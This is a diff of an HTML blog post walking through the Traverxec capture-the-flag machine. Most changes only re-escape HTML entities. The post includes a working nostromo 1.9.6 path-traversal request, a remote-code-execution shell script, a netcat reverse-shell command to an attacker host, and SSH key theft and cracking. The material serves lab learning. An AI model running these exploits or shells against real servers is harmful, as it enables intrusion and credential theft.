@@ -50,13 +50,13 @@ This could help us make educated guesses for the username later if necessary.</p
 some information about the software serving us this website.</p>
 <pre><code>debian $ curl -v 10.10.10.165
 ...
-< HTTP/1.1 200 OK
-< Date: Thu, 16 Apr 2020 01:48:05 GMT
-<span style="color:red">< Server: nostromo 1.9.6</span>
-< Connection: close
-< Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
-< Content-Length: 15674
-< Content-Type: text/html
+&lt; HTTP/1.1 200 OK
+&lt; Date: Thu, 16 Apr 2020 01:48:05 GMT
+&lt;span style=&quot;color:red&quot;&gt;&lt; Server: nostromo 1.9.6&lt;/span&gt;
+&lt; Connection: close
+&lt; Last-Modified: Fri, 25 Oct 2019 21:11:09 GMT
+&lt; Content-Length: 15674
+&lt; Content-Type: text/html
 ...
 </code></pre>
 <p>The line highlighted in red above rings many bells as nostromo is not a piece
@@ -70,14 +70,14 @@ implement I wrote quick shell script that exploits this. I prefer implementing
 my own exploits when feasible over using pre-made toolkits such as metasploit.</p>
 <p>This exploit relies on a path traversal protection bypass, which can be used
 to request arbitrary files of the server.</p>
-<pre><code>debian $ printf "GET /.%%0d./.%%0d./.%%0d./.%%0d./etc/passwd HTTP/1.0\r\n\r\n" | nc 10.10.10.165 80
+<pre><code>debian $ printf &quot;GET /.%%0d./.%%0d./.%%0d./.%%0d./etc/passwd HTTP/1.0\r\n\r\n&quot; | nc 10.10.10.165 80
 HTTP/1.1 200 OK
 Date: Thu, 16 Apr 2020 02:05:27 GMT
 Server: nostromo 1.9.6
 Connection: close
 Last-Modified: Fri, 25 Oct 2019 18:34:30 GMT
 Content-Length: 1395
-Content-Type: text/html<br>
+Content-Type: text/html&lt;br&gt;
 root:x:0:0:root:/root:/bin/bash
 ...
 david:x:1000:1000:david,,,:/home/david:/bin/bash
@@ -85,13 +85,13 @@ david:x:1000:1000:david,,,:/home/david:/bin/bash
 </code></pre>
 <p>Unfortunetly for the users of nostromo, and fortunetly for us this gets much
 worse when we <code>POST</code> instead of <code>GET</code>-ing. We can post commands to <code>/bin/sh</code>
-and instead of giving us the binary contents, the server executes it with
-**our** input, thus we gain remote command execution with the same permission
-as nostromo itself has.</p>
+and instead of giving us the binary contents, the server executes it with</p>
+<ul><li>*our** input, thus we gain remote command execution with the same permission
+as nostromo itself has.</li></ul>
 <p>The following shell script implements this.</p>
 <pre><code>#!/bin/sh
 # Usage: rce.sh ip command
-printf "POST /.%%0d./.%%0d./.%%0d./.%%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n$2 2>&1\n" | nc $1 80
+printf &quot;POST /.%%0d./.%%0d./.%%0d./.%%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n$2 2&gt;&amp;1\n&quot; | nc $1 80
 </code></pre>
 <p>This might look very dense, but all we are doing is generating an HTTP request
 using printf into netcat with the body of the request being the command we
@@ -103,9 +103,9 @@ debian $ nc -lvp 9999
 www-data@traverxec $ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@traverxec $ hostname
-traverxec<br>
+traverxec&lt;br&gt;
 Second shell on hacker computer:
-debian $ ./rce.sh 10.10.10.165 "nc hacker_ip 9999 -e /bin/sh"
+debian $ ./rce.sh 10.10.10.165 &quot;nc hacker_ip 9999 -e /bin/sh&quot;
 </code></pre>
 <h2>Step 3: Owning david</h2>
 <p>Using the reverse shell from the last step I enumerate what can I access as
@@ -135,7 +135,7 @@ but lets look elsewhere first.</p>
 <p>I take a look at <code>nhttpd.conf</code> and it contains the following interesting section.</p>
 <pre><code>www-data@traverxec $ cat /var/nostromo/conf/nhttpd.conf
 ...
-# HOMEDIRS [OPTIONAL]<br>
+# HOMEDIRS [OPTIONAL]&lt;br&gt;
 homedirs            /home
 homedirs_public     public_www
 ...
@@ -149,7 +149,7 @@ as <code>find</code> must have missed it if <code>/home/david</code> itself is u
 /home/david/public_www
 /home/david/public_www/index.html
 /home/david/public_www/protected-file-area
-<span style="color:red">/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</span>
+&lt;span style=&quot;color:red&quot;&gt;/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz&lt;/span&gt;
 /home/david/public_www/protected-file-area/.htaccess
 www-data@traverxec $ tar tf /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 home/david/.ssh/
@@ -166,7 +166,7 @@ www-data@traverxec $ cat home/david/.ssh/id_rsa; rm -rf backup-ssh-identity-file
 </code></pre>
 <p>Looking at our newly acquired ssh key we can see it is password protected, but
 we can use john the ripper again to find the password and decrypt the key.</p>
-<pre><code>debian $ ssh2john id_david > id_david_hash
+<pre><code>debian $ ssh2john id_david &gt; id_david_hash
 debian $ john --wordlist=rockyou.txt id_david_hash
 ...
 debian $ ssh-keygen -p -f id_david
@@ -199,7 +199,7 @@ what <code>david</code> left on it.</p>
 /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz
 /home/david/public_www/protected-file-area/.htaccess
 /home/david/bin
-<span style="color:red">/home/david/bin/server-stats.sh</span>
+&lt;span style=&quot;color:red&quot;&gt;/home/david/bin/server-stats.sh&lt;/span&gt;
 /home/david/bin/server-stats.head
 /home/david/.bash_history
 /home/david/.bash_logout
@@ -210,14 +210,14 @@ what <code>david</code> left on it.</p>
 of the webserver log, but most importantly does **not** require a password to do
 it. Now we look at the code and see why.</p>
 <pre><code>david@traverxec $ cat /home/david/bin/server-stats.sh
-#!/bin/bash<br>
+#!/bin/bash&lt;br&gt;
 cat /home/david/bin/server-stats.head
-echo "Load: `/usr/bin/uptime`"
-echo " "
-echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
-echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
-echo " "
-echo "Last 5 journal log lines:"
+echo &quot;Load: `/usr/bin/uptime`&quot;
+echo &quot; &quot;
+echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;
+echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;
+echo &quot; &quot;
+echo &quot;Last 5 journal log lines:&quot;
 /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
 </code></pre>
 <p>As you can see <code>david</code> allowed himself to run <code>journalctl</code> as <code>root</code>. Sadly for
